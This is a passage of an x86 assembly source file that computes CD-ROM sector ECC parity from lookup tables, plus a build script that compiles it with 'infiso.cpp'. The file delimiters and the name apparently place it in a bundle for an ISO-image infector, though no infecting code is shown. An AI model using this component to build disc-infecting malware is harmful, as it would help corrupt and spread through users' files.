                or      al, al
                jz      @@0
                dec     al
                jz      @@1
                dec     al
                jz      @@2

                xor     eax, eax
                retn

@@0:            mov     eax, 2
                retn

@@1:            mov     eax, 3
                retn

@@2:            xor     eax, eax
                test    byte ptr [ecx+12h], 20h
                setnz   al
                add     eax, 5
                retn

; input: ECX = ptr to sector

calc_csum:

arg_0           = dword ptr  4

var_x4          = byte ptr -22h
var_x3          = byte ptr -21h
var_x2          = dword ptr -20h
var_x1          = dword ptr -1Ch
var_dword_ptr   = dword ptr -18h
var_t3          = dword ptr -14h
var_t2          = dword ptr -10h
var_t1          = dword ptr -0Ch
var_dword_saved = dword ptr -8
var_dword_value = dword ptr -4

                sub     esp, 24h
                push    ebx
                push    ebp
                mov     ebp, ecx
                push    esi
                push    edi

                xor     eax, eax
                cmp     byte ptr [ebp+0Fh], 2
                setz    al
                xor     edi, edi
                mov     [esp+34h+var_dword_saved], eax
                cmp     eax, edi
                jz      @@dontsave
                mov     eax, [ebp+0Ch]
                mov     [ebp+0Ch], edi
                mov     [esp+34h+var_dword_value], eax
@@dontsave:
                lea     ecx, [ebp+0Ch]
                mov     [esp+34h+var_dword_ptr], ecx

@@cycle_1:                              ; CODE XREF: sub_401640+10Fj
                xor     cl, cl
                xor     bl, bl
                mov     [esp+34h+var_x4], 0
                mov     byte ptr [esp+34h+var_x2], cl
                mov     [esp+34h+var_x3], cl
                mov     byte ptr [esp+34h+var_x1], bl

                mov     eax, [esp+34h+arg_0]
                test    eax, eax
                jz      @@skip1

                mov     eax, edi
                cdq
                sub     eax, edx
                sar     eax, 1
                mov     dl, tab4[eax]
                test    dl, dl
                jnz     @@skip_cycle2
@@skip1:
                mov     edx, [esp+34h+var_dword_ptr]
                mov     [esp+34h+var_t3], 24
                mov     eax, edx
                lea     ecx, [edx+1]
                sub     eax, ecx
                lea     esi, [ecx+edi]
                mov     [esp+34h+var_t1], eax
                jmp     @@in2

@@cycle2:                               ; CODE XREF: sub_401640+E3j
                mov     eax, [esp+34h+var_t1]

@@in2:
                mov     edx, [esp+34h+var_x2]
                xor     ecx, ecx
                mov     cl, [eax+esi]
                and     edx, 0FFh
                mov     eax, ecx
                add     esi, 86
                xor     eax, edx
                mov     dl, [esp+34h+var_x4]
                mov     cl, tab1[eax]
                mov     al, tab2[eax]
                xor     cl, dl
                mov     edx, [esp+34h+var_x1]
                mov     [esp+34h+var_x4], al
                xor     eax, eax
                mov     al, [esi-86]
                and     edx, 0FFh
                xor     eax, edx
                mov     dl, [esp+34h+var_x3]
                mov     byte ptr [esp+34h+var_x2], cl
                mov     bl, tab1[eax]
                mov     al, tab2[eax]
                mov     [esp+34h+var_x3], al
                mov     eax, [esp+34h+var_t3]
                xor     bl, dl
                dec     eax
                mov     byte ptr [esp+34h+var_x1], bl
                mov     [esp+34h+var_t3], eax
                jnz     @@cycle2
@@skip_cycle2:
                mov     dl, [esp+34h+var_x3]
                mov     [edi+ebp+81Ch], cl
                mov     cl, [esp+34h+var_x4]
                mov     [edi+ebp+81Dh], bl
                mov     [edi+ebp+872h], cl
                mov     [edi+ebp+873h], dl

                add     edi, 2
                cmp     edi, 86
                jl      @@cycle_1
;;
                xor     edi, edi
                xor     esi, esi
                mov     [esp+34h+var_t2], edi
                mov     [esp+34h+var_t1], esi

@@cycle3:
                xor     cl, cl
                xor     bl, bl
                mov     [esp+34h+var_x4], 0
                mov     byte ptr [esp+34h+var_x2], cl
                mov     [esp+34h+var_x3], cl
                mov     byte ptr [esp+34h+var_x1], bl

                mov     eax, [esp+34h+arg_0]
                test    eax, eax
                jz      @@skip2

                mov     eax, edi
                cdq
                sub     eax, edx
                sar     eax, 1
                mov     dl, tab3[eax]
                test    dl, dl
                jnz     @@skip_cycle4
@@skip2:
                mov     [esp+34h+var_t3], 2Bh

@@cycle4:
                mov     eax, esi
                mov     ecx, 86*26
                cdq
                idiv    ecx
                mov     edi, [esp+34h+var_dword_ptr]
                mov     ecx, [esp+34h+var_x2]
                xor     eax, eax
                mov     bl, [esp+34h+var_x4]
                and     ecx, 0FFh
                add     esi, 86+2
                mov     al, [edx+edi]
                xor     eax, ecx
                mov     cl, tab1[eax]
                mov     al, tab2[eax]
                mov     [esp+34h+var_x4], al
                xor     eax, eax
                mov     al, [edi+edx+1]
                mov     edx, [esp+34h+var_x1]
                and     edx, 0FFh
                xor     cl, bl
                xor     eax, edx
                mov     dl, [esp+34h+var_x3]
                mov     byte ptr [esp+34h+var_x2], cl
                mov     bl, tab1[eax]
                mov     al, tab2[eax]
                mov     [esp+34h+var_x3], al
                mov     eax, [esp+34h+var_t3]
                xor     bl, dl
                dec     eax
                mov     byte ptr [esp+34h+var_x1], bl
                mov     [esp+34h+var_t3], eax
                jnz     @@cycle4

                mov     esi, [esp+34h+var_t1]
                mov     edi, [esp+34h+var_t2]

@@skip_cycle4:
                mov     dl, [esp+34h+var_x3]
                mov     [edi+ebp+8C8h], cl
                mov     cl, [esp+34h+var_x4]
                mov     [edi+ebp+8C9h], bl
                mov     [edi+ebp+8FCh], cl
                mov     [edi+ebp+8FDh], dl
                add     esi, 86
                add     edi, 2
                mov     [esp+34h+var_t2], edi
                mov     [esp+34h+var_t1], esi

                cmp     esi, 86*26
                jl      @@cycle3

                pop     edi
                pop     esi
                pop     ebp
                pop     ebx

                mov     eax, [esp+24h+var_dword_saved]
                test    eax, eax
                jz      @@exit
                mov     ecx, [esp+24h+var_dword_ptr]
                mov     eax, [esp+24h+var_dword_value]
                mov     [ecx], eax
@@exit:
                add     esp, 24h
                retn    4

; --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE ---

                .data

; --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA ---

tab4            db    0,   0,   1,   1,   1,   1,   1,   1
                db    1,   1,   1,   1,   1,   1,   1,   1
                db    1,   1,   1,   1,   1,   1,   1,   1
                db    1,   1,   1,   1,   1,   1,   1,   1
                db    1,   1,   1,   1,   1,   0,   0,   1
                db    1,   1,   1,   0

tab3            db    0,   1,   1,   1,   1,   1,   1,   1
                db    1,   1,   1,   0,   0,   0,   0,   1
                db    1,   1,   1,   1,   1,   1,   1,   0
                db    0,   0,   0,   0

tab1024         db    0,   0,   0,   0,   1,   1, 91h, 90h
                db    1,   2, 21h, 91h,   0,   3,0B0h,   1
                db    1,   4, 41h, 92h,   0,   5,0D0h,   2
                db    0,   6, 60h,   3,   1,   7,0F1h, 93h
                db    1,   8, 81h, 94h,   0,   9, 10h,   4
                db    0, 0Ah,0A0h,   5,   1, 0Bh, 31h, 95h
                db    0, 0Ch,0C0h,   6,   1, 0Dh, 51h, 96h
                db    1, 0Eh,0E1h, 97h,   0, 0Fh, 70h,   7
                db    1, 10h,   1, 99h,   0, 11h, 90h,   9
                db    0, 12h, 20h,   8,   1, 13h,0B1h, 98h
                db    0, 14h, 40h, 0Bh,   1, 15h,0D1h, 9Bh
                db    1, 16h, 61h, 9Ah,   0, 17h,0F0h, 0Ah
                db    0, 18h, 80h, 0Dh,   1, 19h, 11h, 9Dh
                db    1, 1Ah,0A1h, 9Ch,   0, 1Bh, 30h, 0Ch
                db    1, 1Ch,0C1h, 9Fh,   0, 1Dh, 50h, 0Fh
                db    0, 1Eh,0E0h, 0Eh,   1, 1Fh, 71h, 9Eh
                db    1, 20h,   1, 82h,   0, 21h, 90h, 12h
                db    0, 22h, 20h, 13h,   1, 23h,0B1h, 83h
                db    0, 24h, 40h, 10h,   1, 25h,0D1h, 80h
                db    1, 26h, 61h, 81h,   0, 27h,0F0h, 11h
                db    0, 28h, 80h, 16h,   1, 29h, 11h, 86h
                db    1, 2Ah,0A1h, 87h,   0, 2Bh, 30h, 17h
                db    1, 2Ch,0C1h, 84h,   0, 2Dh, 50h, 14h
                db    0, 2Eh,0E0h, 15h,   1, 2Fh, 71h, 85h
                db    0, 30h,   0, 1Bh,   1, 31h, 91h, 8Bh
                db    1, 32h, 21h, 8Ah,   0, 33h,0B0h, 1Ah
                db    1, 34h, 41h, 89h,   0, 35h,0D0h, 19h
                db    0, 36h, 60h, 18h,   1, 37h,0F1h, 88h
                db    1, 38h, 81h, 8Fh,   0, 39h, 10h, 1Fh
                db    0, 3Ah,0A0h, 1Eh,   1, 3Bh, 31h, 8Eh
                db    0, 3Ch,0C0h, 1Dh,   1, 3Dh, 51h, 8Dh
                db    1, 3Eh,0E1h, 8Ch,   0, 3Fh, 70h, 1Ch
                db    1, 40h,   1,0B4h,   0, 41h, 90h, 24h
                db    0, 42h, 20h, 25h,   1, 43h,0B1h,0B5h
                db    0, 44h, 40h, 26h,   1, 45h,0D1h,0B6h
                db    1, 46h, 61h,0B7h,   0, 47h,0F0h, 27h
                db    0, 48h, 80h, 20h,   1, 49h, 11h,0B0h
                db    1, 4Ah,0A1h,0B1h,   0, 4Bh, 30h, 21h
                db    1, 4Ch,0C1h,0B2h,   0, 4Dh, 50h, 22h
                db    0, 4Eh,0E0h, 23h,   1, 4Fh, 71h,0B3h
                db    0, 50h,   0, 2Dh,   1, 51h, 91h,0BDh
                db    1, 52h, 21h,0BCh,   0, 53h,0B0h, 2Ch
                db    1, 54h, 41h,0BFh,   0, 55h,0D0h, 2Fh
                db    0, 56h, 60h, 2Eh,   1, 57h,0F1h,0BEh
                db    1, 58h, 81h,0B9h,   0, 59h, 10h, 29h
                db    0, 5Ah,0A0h, 28h,   1, 5Bh, 31h,0B8h
                db    0, 5Ch,0C0h, 2Bh,   1, 5Dh, 51h,0BBh
                db    1, 5Eh,0E1h,0BAh,   0, 5Fh, 70h, 2Ah
                db    0, 60h,   0, 36h,   1, 61h, 91h,0A6h
                db    1, 62h, 21h,0A7h,   0, 63h,0B0h, 37h
                db    1, 64h, 41h,0A4h,   0, 65h,0D0h, 34h
                db    0, 66h, 60h, 35h,   1, 67h,0F1h,0A5h
                db    1, 68h, 81h,0A2h,   0, 69h, 10h, 32h
                db    0, 6Ah,0A0h, 33h,   1, 6Bh, 31h,0A3h
                db    0, 6Ch,0C0h, 30h,   1, 6Dh, 51h,0A0h
                db    1, 6Eh,0E1h,0A1h,   0, 6Fh, 70h, 31h
                db    1, 70h,   1,0AFh,   0, 71h, 90h, 3Fh
                db    0, 72h, 20h, 3Eh,   1, 73h,0B1h,0AEh
                db    0, 74h, 40h, 3Dh,   1, 75h,0D1h,0ADh
                db    1, 76h, 61h,0ACh,   0, 77h,0F0h, 3Ch
                db    0, 78h, 80h, 3Bh,   1, 79h, 11h,0ABh
                db    1, 7Ah,0A1h,0AAh,   0, 7Bh, 30h, 3Ah
                db    1, 7Ch,0C1h,0A9h,   0, 7Dh, 50h, 39h
                db    0, 7Eh,0E0h, 38h,   1, 7Fh, 71h,0A8h
                db    1, 80h,   1,0D8h,   0, 81h, 90h, 48h
                db    0, 82h, 20h, 49h,   1, 83h,0B1h,0D9h
                db    0, 84h, 40h, 4Ah,   1, 85h,0D1h,0DAh
                db    1, 86h, 61h,0DBh,   0, 87h,0F0h, 4Bh
                db    0, 88h, 80h, 4Ch,   1, 89h, 11h,0DCh
                db    1, 8Ah,0A1h,0DDh,   0, 8Bh, 30h, 4Dh
                db    1, 8Ch,0C1h,0DEh,   0, 8Dh, 50h, 4Eh
                db    0, 8Eh,0E0h, 4Fh,   1, 8Fh, 71h,0DFh
                db    0, 90h,   0, 41h,   1, 91h, 91h,0D1h
                db    1, 92h, 21h,0D0h,   0, 93h,0B0h, 40h
                db    1, 94h, 41h,0D3h,   0, 95h,0D0h, 43h
                db    0, 96h, 60h, 42h,   1, 97h,0F1h,0D2h
                db    1, 98h, 81h,0D5h,   0, 99h, 10h, 45h
                db    0, 9Ah,0A0h, 44h,   1, 9Bh, 31h,0D4h
                db    0, 9Ch,0C0h, 47h,   1, 9Dh, 51h,0D7h
                db    1, 9Eh,0E1h,0D6h,   0, 9Fh, 70h, 46h
                db    0,0A0h,   0, 5Ah,   1,0A1h, 91h,0CAh
                db    1,0A2h, 21h,0CBh,   0,0A3h,0B0h, 5Bh
                db    1,0A4h, 41h,0C8h,   0,0A5h,0D0h, 58h
                db    0,0A6h, 60h, 59h,   1,0A7h,0F1h,0C9h
                db    1,0A8h, 81h,0CEh,   0,0A9h, 10h, 5Eh
                db    0,0AAh,0A0h, 5Fh,   1,0ABh, 31h,0CFh
                db    0,0ACh,0C0h, 5Ch,   1,0ADh, 51h,0CCh
                db    1,0AEh,0E1h,0CDh,   0,0AFh, 70h, 5Dh
                db    1,0B0h,   1,0C3h,   0,0B1h, 90h, 53h
                db    0,0B2h, 20h, 52h,   1,0B3h,0B1h,0C2h
                db    0,0B4h, 40h, 51h,   1,0B5h,0D1h,0C1h
                db    1,0B6h, 61h,0C0h,   0,0B7h,0F0h, 50h
                db    0,0B8h, 80h, 57h,   1,0B9h, 11h,0C7h
                db    1,0BAh,0A1h,0C6h,   0,0BBh, 30h, 56h
                db    1,0BCh,0C1h,0C5h,   0,0BDh, 50h, 55h
                db    0,0BEh,0E0h, 54h,   1,0BFh, 71h,0C4h
                db    0,0C0h,   0, 6Ch,   1,0C1h, 91h,0FCh
                db    1,0C2h, 21h,0FDh,   0,0C3h,0B0h, 6Dh
                db    1,0C4h, 41h,0FEh,   0,0C5h,0D0h, 6Eh
                db    0,0C6h, 60h, 6Fh,   1,0C7h,0F1h,0FFh
                db    1,0C8h, 81h,0F8h,   0,0C9h, 10h, 68h
                db    0,0CAh,0A0h, 69h,   1,0CBh, 31h,0F9h
                db    0,0CCh,0C0h, 6Ah,   1,0CDh, 51h,0FAh
                db    1,0CEh,0E1h,0FBh,   0,0CFh, 70h, 6Bh
                db    1,0D0h,   1,0F5h,   0,0D1h, 90h, 65h
                db    0,0D2h, 20h, 64h,   1,0D3h,0B1h,0F4h
                db    0,0D4h, 40h, 67h,   1,0D5h,0D1h,0F7h
                db    1,0D6h, 61h,0F6h,   0,0D7h,0F0h, 66h
                db    0,0D8h, 80h, 61h,   1,0D9h, 11h,0F1h
                db    1,0DAh,0A1h,0F0h,   0,0DBh, 30h, 60h
                db    1,0DCh,0C1h,0F3h,   0,0DDh, 50h, 63h
                db    0,0DEh,0E0h, 62h,   1,0DFh, 71h,0F2h
                db    1,0E0h,   1,0EEh,   0,0E1h, 90h, 7Eh
                db    0,0E2h, 20h, 7Fh,   1,0E3h,0B1h,0EFh
                db    0,0E4h, 40h, 7Ch,   1,0E5h,0D1h,0ECh
                db    1,0E6h, 61h,0EDh,   0,0E7h,0F0h, 7Dh
                db    0,0E8h, 80h, 7Ah,   1,0E9h, 11h,0EAh
                db    1,0EAh,0A1h,0EBh,   0,0EBh, 30h, 7Bh
                db    1,0ECh,0C1h,0E8h,   0,0EDh, 50h, 78h
                db    0,0EEh,0E0h, 79h,   1,0EFh, 71h,0E9h
                db    0,0F0h,   0, 77h,   1,0F1h, 91h,0E7h
                db    1,0F2h, 21h,0E6h,   0,0F3h,0B0h, 76h
                db    1,0F4h, 41h,0E5h,   0,0F5h,0D0h, 75h
                db    0,0F6h, 60h, 74h,   1,0F7h,0F1h,0E4h
                db    1,0F8h, 81h,0E3h,   0,0F9h, 10h, 73h
                db    0,0FAh,0A0h, 72h,   1,0FBh, 31h,0E2h
                db    0,0FCh,0C0h, 71h,   1,0FDh, 51h,0E1h
                db    1,0FEh,0E1h,0E0h,   0,0FFh, 70h, 70h

tab2            db    0,   2,   4,   6,   8, 0Ah, 0Ch, 0Eh
                db  10h, 12h, 14h, 16h, 18h, 1Ah, 1Ch, 1Eh
                db  20h, 22h, 24h, 26h, 28h, 2Ah, 2Ch, 2Eh
                db  30h, 32h, 34h, 36h, 38h, 3Ah, 3Ch, 3Eh
                db  40h, 42h, 44h, 46h, 48h, 4Ah, 4Ch, 4Eh
                db  50h, 52h, 54h, 56h, 58h, 5Ah, 5Ch, 5Eh
                db  60h, 62h, 64h, 66h, 68h, 6Ah, 6Ch, 6Eh
                db  70h, 72h, 74h, 76h, 78h, 7Ah, 7Ch, 7Eh
                db  80h, 82h, 84h, 86h, 88h, 8Ah, 8Ch, 8Eh
                db  90h, 92h, 94h, 96h, 98h, 9Ah, 9Ch, 9Eh
                db 0A0h,0A2h,0A4h,0A6h,0A8h,0AAh,0ACh,0AEh
                db 0B0h,0B2h,0B4h,0B6h,0B8h,0BAh,0BCh,0BEh
                db 0C0h,0C2h,0C4h,0C6h,0C8h,0CAh,0CCh,0CEh
                db 0D0h,0D2h,0D4h,0D6h,0D8h,0DAh,0DCh,0DEh
                db 0E0h,0E2h,0E4h,0E6h,0E8h,0EAh,0ECh,0EEh
                db 0F0h,0F2h,0F4h,0F6h,0F8h,0FAh,0FCh,0FEh
                db  1Dh, 1Fh, 19h, 1Bh, 15h, 17h, 11h, 13h
                db  0Dh, 0Fh,   9, 0Bh,   5,   7,   1,   3
                db  3Dh, 3Fh, 39h, 3Bh, 35h, 37h, 31h, 33h
                db  2Dh, 2Fh, 29h, 2Bh, 25h, 27h, 21h, 23h
                db  5Dh, 5Fh, 59h, 5Bh, 55h, 57h, 51h, 53h
                db  4Dh, 4Fh, 49h, 4Bh, 45h, 47h, 41h, 43h
                db  7Dh, 7Fh, 79h, 7Bh, 75h, 77h, 71h, 73h
                db  6Dh, 6Fh, 69h, 6Bh, 65h, 67h, 61h, 63h
                db  9Dh, 9Fh, 99h, 9Bh, 95h, 97h, 91h, 93h
                db  8Dh, 8Fh, 89h, 8Bh, 85h, 87h, 81h, 83h
                db 0BDh,0BFh,0B9h,0BBh,0B5h,0B7h,0B1h,0B3h
                db 0ADh,0AFh,0A9h,0ABh,0A5h,0A7h,0A1h,0A3h
                db 0DDh,0DFh,0D9h,0DBh,0D5h,0D7h,0D1h,0D3h
                db 0CDh,0CFh,0C9h,0CBh,0C5h,0C7h,0C1h,0C3h
                db 0FDh,0FFh,0F9h,0FBh,0F5h,0F7h,0F1h,0F3h
                db 0EDh,0EFh,0E9h,0EBh,0E5h,0E7h,0E1h,0E3h

tab1            db    0,   3,   6,   5, 0Ch, 0Fh, 0Ah,   9
                db  18h, 1Bh, 1Eh, 1Dh, 14h, 17h, 12h, 11h
                db  30h, 33h, 36h, 35h, 3Ch, 3Fh, 3Ah, 39h
                db  28h, 2Bh, 2Eh, 2Dh, 24h, 27h, 22h, 21h
                db  60h, 63h, 66h, 65h, 6Ch, 6Fh, 6Ah, 69h
                db  78h, 7Bh, 7Eh, 7Dh, 74h, 77h, 72h, 71h
                db  50h, 53h, 56h, 55h, 5Ch, 5Fh, 5Ah, 59h
                db  48h, 4Bh, 4Eh, 4Dh, 44h, 47h, 42h, 41h
                db 0C0h,0C3h,0C6h,0C5h,0CCh,0CFh,0CAh,0C9h
                db 0D8h,0DBh,0DEh,0DDh,0D4h,0D7h,0D2h,0D1h
                db 0F0h,0F3h,0F6h,0F5h,0FCh,0FFh,0FAh,0F9h
                db 0E8h,0EBh,0EEh,0EDh,0E4h,0E7h,0E2h,0E1h
                db 0A0h,0A3h,0A6h,0A5h,0ACh,0AFh,0AAh,0A9h
                db 0B8h,0BBh,0BEh,0BDh,0B4h,0B7h,0B2h,0B1h
                db  90h, 93h, 96h, 95h, 9Ch, 9Fh, 9Ah, 99h
                db  88h, 8Bh, 8Eh, 8Dh, 84h, 87h, 82h, 81h
                db  9Dh, 9Eh, 9Bh, 98h, 91h, 92h, 97h, 94h
                db  85h, 86h, 83h, 80h, 89h, 8Ah, 8Fh, 8Ch
                db 0ADh,0AEh,0ABh,0A8h,0A1h,0A2h,0A7h,0A4h
                db 0B5h,0B6h,0B3h,0B0h,0B9h,0BAh,0BFh,0BCh
                db 0FDh,0FEh,0FBh,0F8h,0F1h,0F2h,0F7h,0F4h
                db 0E5h,0E6h,0E3h,0E0h,0E9h,0EAh,0EFh,0ECh
                db 0CDh,0CEh,0CBh,0C8h,0C1h,0C2h,0C7h,0C4h
                db 0D5h,0D6h,0D3h,0D0h,0D9h,0DAh,0DFh,0DCh
                db  5Dh, 5Eh, 5Bh, 58h, 51h, 52h, 57h, 54h
                db  45h, 46h, 43h, 40h, 49h, 4Ah, 4Fh, 4Ch
                db  6Dh, 6Eh, 6Bh, 68h, 61h, 62h, 67h, 64h
                db  75h, 76h, 73h, 70h, 79h, 7Ah, 7Fh, 7Ch
                db  3Dh, 3Eh, 3Bh, 38h, 31h, 32h, 37h, 34h
                db  25h, 26h, 23h, 20h, 29h, 2Ah, 2Fh, 2Ch
                db  0Dh, 0Eh, 0Bh,   8,   1,   2,   7,   4
                db  15h, 16h, 13h, 10h, 19h, 1Ah, 1Fh, 1Ch

; --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA --- DATA ---

                end
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ECC.ASM]컴
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MAKE.BAT]컴
@echo off
bcc32.exe -lap -5 -C -pr -ff -O2 infiso.cpp ecc.asm
del infiso.tds
del infiso.obj
del ecc.obj
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[MAKE.BAT]컴
